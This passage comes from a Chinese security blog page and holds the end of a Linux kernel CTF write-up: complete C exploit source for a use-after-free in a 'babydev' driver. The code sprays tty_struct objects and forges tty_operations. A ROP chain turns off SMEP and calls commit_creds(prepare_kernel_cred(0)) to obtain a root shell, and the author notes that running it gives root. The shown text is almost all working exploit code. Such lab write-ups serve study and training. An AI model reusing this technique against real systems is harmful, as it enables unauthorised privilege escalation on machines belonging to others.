class="comment">int magic; // 4</span></span><br><span class="line"><span class="comment">struct kref kref; // 4</span></span><br><span class="line"><span class="comment">struct device *dev; // 8</span></span><br><span class="line"><span class="comment">struct tty_driver *driver; // 8</span></span><br><span class="line"><span class="comment">const struct tty_operations *ops; // 8, offset = 4 + 4 + 8 + 8 = 24</span></span><br><span class="line"><span class="comment">[...]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">    <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span> (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*write)(struct tty_struct * tty,</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span> (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*ioctl)(struct tty_struct *tty,</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">    struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>)))(*_commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (*_prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Gadgets */</span></span><br><span class="line">_commit_creds commit_creds = (_commit_creds) <span class="number">0xffffffff810a1420</span>;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> native_write_cr4 = <span class="number">0xFFFFFFFF810635B0</span>; <span class="comment">// 写入cr4来关闭smep</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> xchgeaxesp = <span class="number">0xFFFFFFFF81007808</span>; <span class="comment">// 设置栈</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> poprdiret = <span class="number">0xFFFFFFFF813E7D6F</span>;</span><br><span class="line"><span class="comment">//unsigned long iretq = 0xFFFFFFFF8181A797;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs = <span class="number">0xFFFFFFFF81063694</span>;  <span class="comment">// 回到用户空间之前的准备</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* status */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_stats</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;movq %%cs, %0\n&quot;</span> <span class="comment">// mov rcx, cs</span></span><br><span class="line">        <span class="string">&quot;movq %%ss, %1\n&quot;</span> <span class="comment">// mov rdx, ss</span></span><br><span class="line">        <span class="string">&quot;pushfq\n&quot;</span>        <span class="comment">// 把rflags的值压栈</span></span><br><span class="line">        <span class="string">&quot;popq %2\n&quot;</span>       <span class="comment">// pop rax</span></span><br><span class="line">        :<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rflags) : : <span class="string">&quot;memory&quot;</span> <span class="comment">// mov user_cs, rcx; mov user_ss, rdx; mov user_flags, rax</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> *buf = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">fake_tty_operations</span> =</span> (struct tty_operations *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct tty_operations));</span><br><span class="line"></span><br><span class="line">    save_stats();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_tty_operations, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct tty_operations));</span><br><span class="line">    fake_tty_operations-&gt;ioctl = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)xchgeaxesp; <span class="comment">// 设置tty的ioctl操作为栈转移指令</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, TTY_STRUCT_SIZE);</span><br><span class="line">    write(fd2, <span class="string">&quot;hello world&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;hello world&quot;</span>));</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray tty 这里的堆喷射其实去掉也能成功，因为是释放后紧接着申请的</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Spraying buffer with tty_struct&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; SPRAY_ALLOC_TIMES; i++) &#123;</span><br><span class="line">        spray_fd[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class="line">        <span class="keyword">if</span> (spray_fd[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;open tty&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 现在有一个tty_struct落在了UAF区域里</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Reading buffer content from kernel buffer&quot;</span>);</span><br><span class="line">    <span class="keyword">long</span> size = read(fd2, buf, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span> (size &lt; <span class="number">32</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Reading not complete!&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Only %ld bytes read.\n&quot;</span>, size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查喷射是否成功</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Detecting buffer content type&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] != <span class="number">0x01</span> || buf[<span class="number">1</span>] != <span class="number">0x54</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] tty_struct spray failed&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] We should have 0x01 and 0x54, instead we got %02x %02x\n&quot;</span>, buf[<span class="number">0</span>], buf[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Exiting...&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置tty_operations为伪造的操作</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Spray complete. Modifying function pointer&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *temp = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;buf[<span class="number">24</span>];</span><br><span class="line">    *temp = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fake_tty_operations;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Preparing ROP chain&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> lower_address = xchgeaxesp &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> base = lower_address &amp; ~<span class="number">0xfff</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Base address is %lx\n&quot;</span>, base);</span><br><span class="line">    <span class="keyword">if</span> (mmap(base, <span class="number">0x30000</span>, <span class="number">7</span>, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>) != base) &#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rop_chain[] = &#123;</span><br><span class="line">        poprdiret,</span><br><span class="line">        <span class="number">0x6f0</span>,</span><br><span class="line">        native_write_cr4, <span class="comment">// cr4 = 0x6f0</span></span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_root,</span><br><span class="line">        swapgs, <span class="comment">// swapgs; pop rbp; ret</span></span><br><span class="line">        base,   <span class="comment">// rbp = base</span></span><br><span class="line">        iretq,</span><br><span class="line">        (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell,</span><br><span class="line">        user_cs,</span><br><span class="line">        user_rflags,</span><br><span class="line">        base + <span class="number">0x10000</span>,</span><br><span class="line">        user_ss</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">void</span>*)lower_address, rop_chain, <span class="keyword">sizeof</span>(rop_chain));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Writing function pointer to the driver&quot;</span>);</span><br><span class="line">    <span class="keyword">long</span> len = write(fd2, buf, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Triggering&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; SPRAY_ALLOC_TIMES; i++) &#123;</span><br><span class="line">        ioctl(spray_fd[i], <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// FFFFFFFF814D8AED call rax</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    exploit();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>静态编译后放入文件目录中，运行即可获得root shell！<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/4148.html">一道简单内核题入门内核利用</a><br><a target="_blank" rel="noopener" href="https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html">NCSTISC Linux Kernel PWN450 Writeup</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Bruce Fan"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Bruce Fan</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">125</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Bruce Fan</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
